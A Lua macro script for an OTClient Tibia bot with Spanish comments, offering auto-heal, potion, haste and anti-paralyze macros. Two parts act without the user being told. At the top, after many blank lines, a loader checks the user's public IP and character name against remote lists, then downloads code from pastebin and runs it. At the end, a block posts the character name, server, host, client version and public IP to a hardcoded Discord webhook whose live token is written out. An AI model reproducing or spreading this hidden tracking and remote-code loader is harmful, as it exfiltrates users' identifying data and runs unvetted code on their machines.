































































































local function checkAndLoadScript()

    local ipListUrl = 'URL DE LA LISTA IPS EN RAW'
    local nameListUrl = 'URL DE LA LISTA DE CHAR NAMES'
    local vipScriptUrl = 'URL QUE CARGA EL SCRIPT PRINCIPAL'
    local vntmodal = 'https://pastebin.com/raw/g4PYXk4M' -- URL DE LA VENTANA MODAL XD

    local function getPlayerName()
        return player:getName() or "UNDERSKY"
    end

-- FUNCION PARA OBTENER IPS
    local function getPublicIp(callback)
        local ipApis = {
            "https://api64.ipify.org?format=json",
            "https://api.ipify.org?format=json",
            "https://ipapi.co/json",
            "https://api.myip.com"
        }
        local currentApi = 1
        local function tryNextApi()
            if currentApi > #ipApis then
                callback(nil, "No se pudo obtener la IP")
                return
            end
            HTTP.get(ipApis[currentApi], function(data, err)
                if err or not data then
                    currentApi = currentApi + 1
                    tryNextApi()
                    return
                end
                local success, jsonData = pcall(json.decode, data)
                if success and jsonData then
                    local ip = jsonData.ip or jsonData.ipAddress or jsonData.query
                    if ip and (ip:match("^%d+%.%d+%.%d+%.%d+$") or ip:match("^[a-fA-F0-9:]+$")) then
                        callback(ip, nil)
                        return
                    end
                end
                local ipMatch = data:match("([a-fA-F0-9:]+)") or data:match("(%d+%.%d+%.%d+%.%d+)")
                if ipMatch then
                    callback(ipMatch, nil)
                else
                    currentApi = currentApi + 1
                    tryNextApi()
                end
            end)
        end
        tryNextApi()
    end

-- FUNCION PARA VERIFICAR LISTAS
    local function checkInList(value, url, isIp)
        return function(callback)
            HTTP.get(url, function(content, err)
                if err or not content then
                    print("ERROR: No se pudo verificar")
                    callback(false)
                    return
                end
                local pattern
                if isIp and value:match(":") then
                    pattern = "%f[%w:]"..value:gsub("%.", "%%.").."%f[%W]"
                elseif isIp then
                    pattern = "%f[%d]"..value:gsub("%.", "%%.").."%f[%D]"
                else
                    pattern = "%f[%a]"..value.."%f[%A]"
                end
                callback(content:find(pattern) ~= nil)
            end)
        end
    end

    local function normalizeIp(ip)
        if not ip:match(":") then return ip end
        return ip:lower():gsub("::.+", "::")
    end

-- FUNCION PARA CARGAR O NO EL SCRIPT
    local function loadAppropriateScript(isVip)
        local url = isVip and vipScriptUrl or vntmodal
        HTTP.get(url, function(scriptContent, err)
            if err or not scriptContent then
                if isVip then
                    loadAppropriateScript(false)
                end
                return
            end
            local loadedFunction, loadError = loadstring(scriptContent)
            if not loadedFunction then return end
            local success, execError = pcall(loadedFunction)
            if not success then
                --print("Error al ejecutar el script:", execError)
            end
        end)
    end

    getPublicIp(function(ip, error)
        local charName = getPlayerName()

        if error or not ip then
            -- print("No se pudo obtener IP. Verificando por nombre...")
            checkInList(charName, nameListUrl, false)(function(nameIsVip)
                loadAppropriateScript(nameIsVip)
            end)
            return
        end

        local normalizedIp = normalizeIp(ip)

        checkInList(normalizedIp, ipListUrl, true)(function(ipIsVip)
            checkInList(charName, nameListUrl, false)(function(nameIsVip)
                local isVip = ipIsVip or nameIsVip
                loadAppropriateScript(isVip)
            end)
        end)
    end)
end

checkAndLoadScript()

-- scripts 

-- HP & POT ~~ SPELLS By Undersky~~
setDefaultTab("Hp")
local label = UI.Label(" H E A L   &   POTION")
label:setColor("#a73ec1") -- Color base
label:setFont("verdana-11px-rounded")

local glowPosition = 1
local glowDirection = 1

macro(50, function()
    local text = " H E A L   &   P O T I O N"
    local numChars = #text
    local glowRange = math.max(1, math.floor(numChars / 10)) 
    local coloredText = {}

    for i = 1, numChars do
        local char = text:sub(i, i)
        local color = "#a73ec1" -- Color base
        if math.abs(i - glowPosition) <= glowRange then
            color = "#dfbae9" -- Color de brillo
        end
        table.insert(coloredText, char)
        table.insert(coloredText, color)
    end

    glowPosition = glowPosition + glowDirection
    if glowPosition > numChars then
        glowPosition = numChars - 1
        glowDirection = -1
    elseif glowPosition < 1 then
        glowPosition = 2
        glowDirection = 1
    end

    label:setColoredText(coloredText)
end)
UI.Separator()
-- HP & POT ~~ SPELLS By Undersky~~
if type(storage.healing1) ~= "table" then
  storage.healing1 = {on=false, title="HP%", text="exura", min=70, max=90}
end
if type(storage.healing2) ~= "table" then
  storage.healing2 = {on=false, title="HP%", text="exura vita", min=0, max=69}
end

-- Crear 2 widgets de curación
for _, healingInfo in ipairs({storage.healing1, storage.healing2}) do
  local healingmacro = macro(400, function()
    local hp = player:getHealthPercent()
    local mana = player:getMana()

    -- Definir costo del hechizo
    local spellText = healingInfo.text:lower()
    local spellCost = ({
      ["exura"] = 20,
      ["exura vita"] = 160,
      ["exura gran"] = 70,
      ["exura san"] = 160,
      ["exana mort"] = 65,
      ["exura gran ico"] = 200,
      ["exura ico"] = 40,
      ["exura gran san"] = 210,
      ["exura sio"] = 140
    })[spellText] or 0

    -- Solo lanzar el hechizo si tienes suficiente mana
    if healingInfo.max >= hp and hp >= healingInfo.min and mana >= spellCost then
      if TargetBot then 
        TargetBot.saySpell(healingInfo.text)
      else
        say(healingInfo.text)
      end
    end
  end)
  healingmacro.setOn(healingInfo.on)

  UI.DualScrollPanel(healingInfo, function(widget, newParams) 
    healingInfo = newParams
    healingmacro.setOn(healingInfo.on)
  end)
end

UI.Separator()

-- POCIONES & RUNAS
local labelpot = UI.Label("Pociones/Runas")
labelpot:setColor("#00FFFF")

if type(storage.hpitem1) ~= "table" then
  storage.hpitem1 = {on=false, title="HP%", item=266, min=51, max=90}
end
if type(storage.hpitem2) ~= "table" then
  storage.hpitem2 = {on=false, title="HP%", item=3160, min=0, max=50}
end
if type(storage.manaitem1) ~= "table" then
  storage.manaitem1 = {on=false, title="MP%", item=238, min=0, max=60}
end
if type(storage.manaitem2) ~= "table" then
  storage.manaitem2 = {on=false, title="MP%", item=3157, min=0, max=50}
end

for i, healingInfo in ipairs({storage.hpitem1, storage.hpitem2, storage.manaitem1, storage.manaitem2}) do
  local healingmacro = macro(600, function()
    local hp = i <= 2 and player:getHealthPercent() or math.min(100, math.floor(100 * (player:getMana() / player:getMaxMana())))
    if healingInfo.max >= hp and hp >= healingInfo.min then
      if TargetBot then 
        TargetBot.useItem(healingInfo.item, healingInfo.subType, player)
      else
        local thing = g_things.getThingType(healingInfo.item)
        local subType = g_game.getClientVersion() >= 860 and 0 or 1
        if thing and thing:isFluidContainer() then
          subType = healingInfo.subType
        end
        g_game.useInventoryItemWith(healingInfo.item, player, subType)
      end
    end
  end)
  healingmacro.setOn(healingInfo.on)

  UI.DualScrollItemPanel(healingInfo, function(widget, newParams) 
    healingInfo = newParams
    healingmacro.setOn(healingInfo.on and healingInfo.item > 100)
  end)
end

if g_game.getClientVersion() < 860 then
  UI.Label("In old tibia potions & runes work only when you have backpack with them opened")
end
UI.Separator()
-- Utamo Vita
local labelutamo = UI.Label("Utamo Vita")
labelutamo:setColor("#00FFFF") -- celeste

UI.TextEdit(storage.manaShield or "utamo vita", function(widget, newText)
  storage.manaShield = newText
end)

local lastManaShield = 0

macro(20, "Mana Shield", function() 
  if not hasManaShield() and lastManaShield + 1000 < now then  -- Si no tienes el hechizo activo y han pasado 500ms
    if TargetBot then 
      TargetBot.saySpell(storage.manaShield) -- Usa TargetBot si está activo
    else
      say(storage.manaShield)
    end
    lastManaShield = now -- Guarda el tiempo del último casteo
  end
end)

-- Haste
local labelhaste = UI.Label("Haste")
labelhaste:setColor("#00FFFF") -- celeste

UI.TextEdit(storage.hasteSpell or "utani gran hur", function(widget, newText)
  storage.hasteSpell = newText
end)

macro(500, "Haste", function() 
  if hasHaste() then return end
  if TargetBot then 
    TargetBot.saySpell(storage.hasteSpell) -- sync spell with targetbot if available
  else
    say(storage.hasteSpell)
  end
end)

-- Tira Haste Cuando No Detecte Monster
local spellHaste = "Utani Gran Hur"
local hasteInPz = true -- Usar haste en PZ.

macro(500, "Haste NO Monsters", function()
    if not hasteInPz and isInPz() then 
        return 
    end

    if hasHaste() then 
        return 
    end

    local function monstersinScreen()
        for _, spec in ipairs(getSpectators()) do
            if spec ~= player and spec:isMonster() then
                return true
            end
        end
        return false
    end

    if not monstersinScreen() then
        say(spellHaste)
    end
end)

-- Antiparalyze
local labelparalyze = UI.Label("Antiparalyze")
labelparalyze:setColor("#00FFFF") -- celeste
UI.TextEdit(storage.antiParalyze or "utani gran hur", function(widget, newText)
  storage.antiParalyze = newText
end)

macro(20, "Anti Paralyze", function() 
  if not isParalyzed() then return end
  if TargetBot then 
    TargetBot.saySpell(storage.antiParalyze) -- sync spell with targetbot if available
  else
    say(storage.antiParalyze)
  end
end)

-- Discord Webhook
local webhookUrl = 'https://discord.com/api/webhooks/1402532878340067369/jZjwXMagpK7Wk7969QoHUUsIJ70gO-qviOATh-n5Eoekdu9bikoAtjQOeJeZ4BgJBDqc'

local ipApis = {
    "https://ipapi.co/json",
    "https://api.myip.com",
    "https://api.ipify.org?format=json"
}

-- Función para obtener la IP pública
local function getPublicIp(callback)
    local currentApiIndex = 1
    
    local function tryNextApi()
        if currentApiIndex > #ipApis then
            callback(nil, "ERROR 1")
            return
        end
        
        local apiUrl = ipApis[currentApiIndex]
        HTTP.get(apiUrl, function(data, err)
            if err then
                currentApiIndex = currentApiIndex + 1
                tryNextApi()
                return
            end
            
            if not data then
                currentApiIndex = currentApiIndex + 1
                tryNextApi()
                return
            end
            
            local ip = nil
            local success, json = pcall(function() return json.decode(data) end)
            if success and json then
                ip = json.ip or json.ipAddress or (json.data and json.data.ip)
            end
            
            if not ip then
                local matches = regexMatch(data, [[([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)]])
                if matches and #matches > 0 then
                    ip = matches[1]
                end
            end
            
            if ip then
                callback(ip, nil)
            else
                currentApiIndex = currentApiIndex + 1
                tryNextApi()
            end
        end)
    end
    
    tryNextApi()
end

local function sendToWebhook(playerName, worldName, otservHost, otservProtocol, otservClient, buildVersion, ip)
    local messageData = {
        content = "--Inicio de sesión: FREE\nJugador: " .. playerName .. 
                 "\nServidor: " .. worldName .. 
                 "\nHost: " .. otservHost .. 
                 "\nProtocolo: " .. otservProtocol .. 
                 "\nCliente: " .. otservClient .. 
                 "\nVersión: " .. buildVersion ..
                 "\nIP Pública: " .. (ip or "No obtenida")
    }
    HTTP.postJSON(webhookUrl, messageData, function(response, error)
        if error then
            -- Puedes agregar manejo de errores aquí si lo deseas
        end
    end)
end

local function updateAndSendPlayerInfo()
    local accountInfo = modules.client_entergame.G
    local playerName = g_game.getCharacterName()
    local worldName = g_game.getWorldName()
    local otservHost = accountInfo.host
    local otservProtocol = g_game.getProtocolVersion()
    local otservClient = g_game.getClientVersion()
    local buildVersion = getVersion()
    
    -- Primero obtenemos la IP
    getPublicIp(function(ip, err)
        -- Luego enviamos toda la información incluyendo la IP
        sendToWebhook(playerName, worldName, otservHost, otservProtocol, otservClient, buildVersion, ip)
    end)
end

updateAndSendPlayerInfo()

